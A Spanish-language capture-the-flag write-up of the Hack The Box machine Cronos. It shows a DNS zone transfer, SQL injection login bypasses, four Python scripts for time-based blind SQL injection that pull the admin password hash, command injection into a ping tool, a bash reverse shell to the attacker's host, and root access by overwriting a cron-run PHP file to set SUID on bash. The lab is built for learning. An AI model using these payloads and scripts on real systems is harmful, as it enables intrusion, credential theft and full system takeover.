---
title: Hack The Box Cronos
author: k4miyo
date: 2022-01-12
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [PHP, SQL, DNS Zone Transfer, SQLi, Web]
ping: true
---

## Cronos
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.13.

```bash
❯ ping -c 1 10.10.10.13
PING 10.10.10.13 (10.10.10.13) 56(84) bytes of data.
64 bytes from 10.10.10.13: icmp_seq=1 ttl=63 time=142 ms

--- 10.10.10.13 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 142.328/142.328/142.328/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.13 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-11 21:38 CST
Initiating SYN Stealth Scan at 21:38
Scanning 10.10.10.13 [65535 ports]
Discovered open port 80/tcp on 10.10.10.13
Discovered open port 22/tcp on 10.10.10.13
Discovered open port 53/tcp on 10.10.10.13
Completed SYN Stealth Scan at 21:39, 26.44s elapsed (65535 total ports)
Nmap scan report for 10.10.10.13
Host is up, received user-set (0.14s latency).
Scanned at 2022-01-11 21:38:44 CST for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 21 (924B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.13
   5   │     [*] Open ports: 22,53,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,53,80 10.10.10.13 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-11 21:39 CST
Nmap scan report for 10.10.10.13
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.81 seconds
```

Vemos el puerto 80 abierto el cual se encuentra asociado al servicio HTTP, así que antes de echarle un ojo vía web, vamos a ver a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://10.10.10.13/
http://10.10.10.13/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.13], Title[Apache2 Ubuntu Default Page: It works]
```

No vemos nada interesante, salvo la página default de Apache2.

![](/assets/images/htb-cronos/cronos-web.png)

Algo que notamos sería que está abierto el puerto 53 en la máquina, el cual está asociado al servicio DNS; por lo que podríamos utiliar `nslookup` para obtener un poco de información debido a que en la captura de `nmap` vemos la palabra **domain**, por lo que ya nos hace pensar que se está aplicando ***virtual hosting***.

```bash
❯ nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
> exit
```

Tenemos el dominio `cronos.htb`, así que vamos a agregarlo a nuestro archivo `/etc/hosts` y ahora vamos a realizar consultas hacia el servidor DNS para obtener otros dominios o subdominios.

```bash
❯ dig @10.10.10.13 cronos.htb ns
                                                                
; <<>> DiG 9.16.15-Debian <<>> @10.10.10.13 cronos.htb ns                                                                        
; (1 server found)
;; global options: +cmd
;; Got answer:                                                  
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62667
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096                          
;; QUESTION SECTION:
;cronos.htb.                    IN      NS
                                                                
;; ANSWER SECTION:
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
                                                                
;; ADDITIONAL SECTION:                                          
ns1.cronos.htb.         604800  IN      A       10.10.10.13

;; Query time: 168 msec         
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: mié ene 12 18:32:56 CST 2022                    
;; MSG SIZE  rcvd: 73
                                
❯ dig @10.10.10.13 cronos.htb mx
                                                                
; <<>> DiG 9.16.15-Debian <<>> @10.10.10.13 cronos.htb mx                                                                        
; (1 server found)
;; global options: +cmd
;; Got answer:                                                  
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 33886
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096                                                                                            
;; QUESTION SECTION:
;cronos.htb.                    IN      MX
                                                                
;; AUTHORITY SECTION:                                           
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800

;; Query time: 164 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)                                                                                           
;; WHEN: mié ene 12 18:33:10 CST 2022
;; MSG SIZE  rcvd: 81

❯ dig @10.10.10.13 cronos.htb axfr

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.13 cronos.htb axfr
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 172 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: mié ene 12 18:33:44 CST 2022
;; XFR size: 7 records (messages 1, bytes 203)

❯ dig @10.10.10.13 cronos.htb ANY

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.13 cronos.htb ANY
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59605
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;cronos.htb.                    IN      ANY

;; ANSWER SECTION:
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13

;; ADDITIONAL SECTION:
ns1.cronos.htb.         604800  IN      A       10.10.10.13

;; Query time: 172 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: mié ene 12 18:33:49 CST 2022
;; MSG SIZE  rcvd: 131
```

Logramos obtener el subdominio `admin.cronos.htb`, por lo que lo agregamos a nuestro archivo `/etc/hosts` y posteriormente vamos a ver a lo que nos enfrentamos con `whatweb` para ambos dominios y despúes echarles un ojo vía web.

```bash
❯ whatweb http://cronos.htb/
http://cronos.htb/ [200 OK] Apache[2.4.18], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.10.13], Laravel, Title[Cronos], X-UA-Compatible[IE=edge]
❯ whatweb http://admin.cronos.htb/
http://admin.cronos.htb/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.13], Title[Login Page]
```

![](/assets/images/htb-cronos/cronos-web1.png)

![](/assets/images/htb-cronos/cronos-web2.png)

En el subdominio `admin.cronos.htb` tenemos un panel de login, por lo que ya deberíamos empezar a pensar en diversas formas de entrar al panel; como el uso de credenciales por default, aplicar fuerza bruta, inyecciones SQL, checar el código del sitio para encontrar posibles pistas, etc. Para este caso, vamos a ver las inyecciones SQL.

- `'` - No vemos nada
- `' or 1=1-- -` - Logramos ingresar al panel

![](/assets/images/htb-cronos/cronos-web3.png)

- `' or sleep(5)-- -` - Vemos que la página tarda 5 segundos en responder, por lo que podríamos tratar de obtener credenciales de la base de datos.

Para hacerlo más interesante y aprender un poco, vamos a hacer una inyección SQL a ciegas (***SQLi blind***); por lo que debemos pensar una forma obtener información utilizando el comando `sleep(t)`. Para esto, debemos preguntar al servidor si la información que buscamos empieza por un caracter, si es verdadero que tarde `x` tiempo en responder y si es falso, que no tarde nada; mediante comandos de SQL sería `if( substr( database(),x,1) = 'a', sleep(5), 1)` en donde `x` nos indica la posición de los caracteres. Por lo tanto:

- **Nombre de la base de datos** - `if ( substr( database(),x,1 ) = 'a', sleep(5), 1)`
- **Nombre de las tablas** - `if ( substr( table_name,x,1 ) = 'a', sleep(5), 1) where table_schema=<<nombre_base_de_datos>> limit y,1` en donde `y` es un número que nos indica el número de la tabla, es decir `y=1` es la primera tabla, `y=2` es la segunda tabla y así sucesivamente.
- **Nombre de las columnas** - 
- **Información** -

Para facilitarnos el trabajo, vamos a crear un script en python para obtener todo lo anterior, empezando primero con el nombre de la base de datos.

```python
#!/usr/bin/python3
#codgin: utf-8

import time, requests, signal, sys
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdefghijklmnopqrstuvwxyz'

def makeRequest(sqli):
    data_post = {
        'username' : '%s' % sqli,
        'password' : 'loquesea'
    }
    time_start = time.time()
    r = requests.post(url, data=data_post)
    time_end = time.time()

    if time_end - time_start > 3:
        return 1

def payload():
    p1 = log.progress("Payload")
    p1.status("Generando el payload")
    p2 = log.progress("Database")
    result = ""
    for i in range(1,10):
        cont = 0
        for c in s:
            sqli = "' or if(substr(database(),%d,1)='%c',sleep(3),1)-- -" % (i, c)
            p1.status("Probando con: %c" % c)
            cont += 1
            if makeRequest(sqli):
                result += c
                p2.status("%s" % result)
                time.sleep(2)
                break
            if cont == 36:
                p1.success("Fin del payload")
                p2.success("El nombre de la base de datos es: %s" % result)
                sys.exit(0)

if __name__ == '__main__':
    payload()
```

```bash
❯ python3 database_name.py
[+] Payload: Fin del payload
[+] Database: El nombre de la base de datos es: admin
```

Tenemos el nombre la base de datos datos que es **admin**, ahora vamos a tratar de obtener las tablas que conforman dicha base y esto lo logramos modificando la consulta, es decir, la variable `sqli` y agregando otro bucle `for`:

```python
#!/usr/bin/python3
#codgin: utf-8

import time, requests, signal, sys
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdefghijklmnopqrstuvwxyz'

def makeRequest(sqli):
    data_post = {
        'username' : '%s' % sqli,
        'password' : 'loquesea'
    }
    time_start = time.time()
    r = requests.post(url, data=data_post)
    time_end = time.time()

    if time_end - time_start > 3:
        return 1

def payload():
    p1 = log.progress("Payload")
    p1.status("Generando el payload")
    result = ""
    for j in range(0,3):
        p2 = log.progress("Table[%d]" % j)
		cont1 = 0        
		for i in range(1,10):
            if cont1 != 1:
                break
            cont = 0
            for c in s:
                sqli = "' or if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(3),1)-- -" % (j, i, c)
                p1.status("Probando con: %c" % c)
                cont += 1
                if makeRequest(sqli):
                    result += c
                    p2.status("%s" % result)
                    time.sleep(2)
                    break
                if cont == 36:
                    cont1 = 1
        p2.success("%s" % result)
        result = ""
    p1.success("Fin del payload")

if __name__ == '__main__':
    payload()
```

```bash
❯ python3 database_tables.py
[+] Payload: Fin del payload
[+] Table[0]: users 
[+] Table[1]:  
[+] Table[2]: 
```

Tenemos el nombre de la única tabla que es **users**. Ahora necesitamos conocer los nombres de las columnas que conforman dicha tabla.

```python
#!/usr/bin/python3
#codgin: utf-8

import time, requests, signal, sys
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdefghijklmnopqrstuvwxyz'

def makeRequest(sqli):
    data_post = {
        'username' : '%s' % sqli,
        'password' : 'loquesea'
    }
    time_start = time.time()
    r = requests.post(url, data=data_post)
    time_end = time.time()

    if time_end - time_start > 3:
        return 1

def payload():
    p1 = log.progress("Payload")
    p1.status("Generando el payload")
    result = ""
    for j in range(0,3):
        p2 = log.progress("Column[%d]" % j)
        cont1 = 0
        for i in range(1,10):
            if cont1 != 0:
                break
            cont = 0
            for c in s:
                sqli = "' or if(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1)='%c',sleep(3),1)-- -" % (j, i, c)
                p1.status("Probando con: %c" % c)
                cont += 1
                if makeRequest(sqli):
                    result += c
                    p2.status("%s" % result)
                    time.sleep(2)
                    break
                if cont == 36:
                    cont1 = 1
        p2.success("%s" % result)
        result = ""
    p1.success("Fin del payload")

if __name__ == '__main__':
    payload()
```

```bash
❯ python3 database_columns.py
[+] Payload: Fin del payload
[+] Column[0]: id
[+] Column[1]: username
[+] Column[2]: password
```

Vemos que la tabla **users** tiene las columnas **id**, **username** y **password**; por lo que nos queda listar los datos que contiene la tabla. Para ir un poco más rapidos, vamos a hacer la inyección `admin' and sleep(5)-- -` para validar si el usuario **admin** existe a en la base de datos y tenemos que el servidor nos tarda 5 segundos en responder; por lo tanto, ya tenemos el usuario, ahora solo nos falta obtener la contraseña:

```python
#!/usr/bin/python3
#codgin: utf-8

import time, requests, signal, sys
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdefghijklmnopqrstuvwxyz'

def makeRequest(sqli):
    data_post = {
        'username' : '%s' % sqli,
        'password' : 'loquesea'
    }
    time_start = time.time()
    r = requests.post(url, data=data_post)
    time_end = time.time()

    if time_end - time_start > 3:
        return 1

def payload():
    p1 = log.progress("Payload")
    p1.status("Generando el payload")
    result = ""
    p2 = log.progress("Password [admin]")
    cont1 = 0
    for i in range(1,50):
        if cont1 != 0:
            break
        cont = 0
        for c in s:
            sqli = "' or if(substr((select password from users where username='admin'),%d,1)='%c',sleep(3),1)-- -" % (i, c)
            p1.status("Probando con: %c" % c)
            cont += 1
            if makeRequest(sqli):
                result += c
                p2.status("%s" % result)
                time.sleep(2)
                break
            if cont == 36:
                cont1 = 1
    p2.success("%s" % result)
    p1.success("Fin del payload")

if __name__ == '__main__':
    payload()
```

```bash
❯ python3 database_password.py
[+] Payload: Fin del payload
[+] Password [admin]: 4f5fffa7b2340178a716e3832451e058
```

Ya tenemos la contraseña hasheada del usuario **admin**, así que vamos a ocupar la herramienta en linea [crackstation](https://crackstation.net/) para crackearla; sin embargo, en esta ocación, no nos regresa un resultado, así que vamos a utilizar otro recurso online [hashes](https://hashes.com/en/decrypt/hash)

![](/assets/images/htb-cronos/cronos-hash.png)

Contamos con credenciales de acceso, así que accedemos al panel y tenemos una utilidad que nos permite ejecutar un `traceroute` y un `ping`; como es posible que dicho comando se ejecute a nivel de sistema, primero vamos a probar el `ping` si lo recibimos en nuestra máquina.

![](/assets/images/htb-cronos/cronos-web4.png)

```bash
❯ tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:48:18.291432 IP cronos.htb > 10.10.14.27: ICMP echo request, id 7587, seq 1, length 64
21:48:18.291575 IP 10.10.14.27 > cronos.htb: ICMP echo reply, id 7587, seq 1, length 64
^C
2 packets captured
2 packets received by filter
0 packets dropped by kernel
```

Recibimos la traza ICMP, por lo que podríamos pensar que tenemos la capacidad de ejecutar ciertos comandos aprovechando dicha herramienta.

- `ping 8.8.8.8;whoami`

![](/assets/images/htb-cronos/cronos-web5.png)

Y vemos el resultado del comando que ejecutamos `whoami`; por lo tanto tenemos ejecución de comandos, ahora nos entablamos una reverse shell a nuestro equipo, por lo que nos ponemos en escucha por el puerto 443:

```bash
ping 10.10.14.27; bash -c "bash -i >& /dev/tcp/10.10.14.27/443 0>&1"
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.13] 42272
bash: cannot set terminal process group (1378): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ whoami
whoami
www-data
www-data@cronos:/var/www/admin$
```

Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt) y así que antes que nada, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty). Ahora debemos encontrar una forma de escalar privilegios, por lo que vamos a enumerara un poco el sistema.

```bash
www-data@cronos:/home/noulis$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cronos:/home/noulis$ sudo -l
[sudo] password for www-data: 
www-data@cronos:/home/noulis$ cd /
www-data@cronos:/$ find \-perm -4000 2>/dev/null
./bin/ping
./bin/umount
./bin/mount
./bin/fusermount
./bin/su
./bin/ntfs-3g
./bin/ping6
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/snapd/snap-confine
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/bin/chsh
./usr/bin/newuidmap
./usr/bin/sudo
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/at
./usr/bin/pkexec
./usr/bin/newgidmap
./usr/bin/gpasswd
./usr/bin/passwd
www-data@cronos:/$ 
```

No vemos nada interesante, así que vamos a generar nuestro archivo de confianza [ProcMon](/procmon) para ver si se está realizando una tarea a intervalos regulares (que debería ya que el nombre de la máquina da pista a *cron*)

```bash
www-data@cronos:/dev/shm$ ./procmon.sh 
> /usr/sbin/CRON -f
> /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
> php /var/www/laravel/artisan schedule:run
< /usr/sbin/CRON -f
< /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
< php /var/www/laravel/artisan schedule:run
> [kworker/u4:2]
^C
www-data@cronos:/dev/shm$ ls -l /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
www-data@cronos:/dev/shm$
```

Y vemos que se está ejecutando a través de php el recurso `/var/www/laravel/artisan` del cual nosotros como **www-data** somos propietario y podemos alterar su contenido; por lo tanto vamos a modificar su contenido a uno que nos permita convertirnos en **root** (suponiendo que dicho usuario es quien realiza la tarea).

```bash
www-data@cronos:/dev/shm$ cat /var/www/laravel/artisan
<?php
        system("chmod u+s /bin/bash");
?>
www-data@cronos:/dev/shm$
```

Ahora esperamos que el usuario **root** nos ejecute nuestro archivo y le otorgue permisos SUID a `/bin/bash`.

```bash
www-data@cronos:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
www-data@cronos:/dev/shm$ bash -p
bash-4.3# whoami
root
bash-4.3#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
